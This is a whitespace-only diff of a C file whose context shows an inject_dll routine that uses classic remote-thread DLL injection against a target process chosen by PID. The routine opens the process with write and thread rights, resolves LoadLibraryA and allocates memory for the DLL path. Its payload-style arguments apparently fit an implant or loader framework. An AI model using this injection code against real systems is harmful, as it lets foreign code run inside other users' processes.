@@ -22,14 +22,14 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     LPVOID remote_buffer;
     HANDLE h_proc;
     HANDLE h_remote_thread;
-    
+
     DEBUG_PRINT("Starting inject_dll routine...\n");
 
     // Extract arguments from payload_info
     // Both pid and dll_path are required, so assume that delimiter ',' is set.
 
     // Cut out pid string by ending the string at delimiter position
-    delimiter = strchr(payload_info, ',');    
+    delimiter = strchr(payload_info, ',');
     target_pid_string = payload_info;
     *delimiter = '\0';
     target_pid = strtoul(target_pid_string, NULL, 0);
@@ -38,7 +38,7 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     // Extract dll_path string by starting after the delimiter
     dll_path = delimiter + 1;
     DEBUG_PRINT("Extracted payload_info::dll_path argument = %s\n", dll_path);
-    
+
     if(target_pid == 0) {
         DEBUG_PRINT("Invalid target PID.\n");
         return;
@@ -47,7 +47,7 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     // Access target process
     DEBUG_PRINT("Accessing target process...\n");
     h_proc = OpenProcess((PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ), FALSE, target_pid);
-    
+
     if(h_proc == NULL) {
         DEBUG_PRINT("Failed to retrieve handle.\n");
         return;
@@ -58,8 +58,8 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     loadlibrary_address = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
     if(loadlibrary_address == NULL) {
         DEBUG_PRINT("Failed to retrieve address.\n");
-        return;    
-    }    
+        return;
+    }
 
     // Allocate buffer in target process to store the path to the dll to be injected
     DEBUG_PRINT("Allocating at least %d bytes of memory in target process to store dll path...\n", strlen(dll_path));
@@ -84,5 +84,5 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
         return;
     }
 
-    CloseHandle(h_proc);    
+    CloseHandle(h_proc);
 }
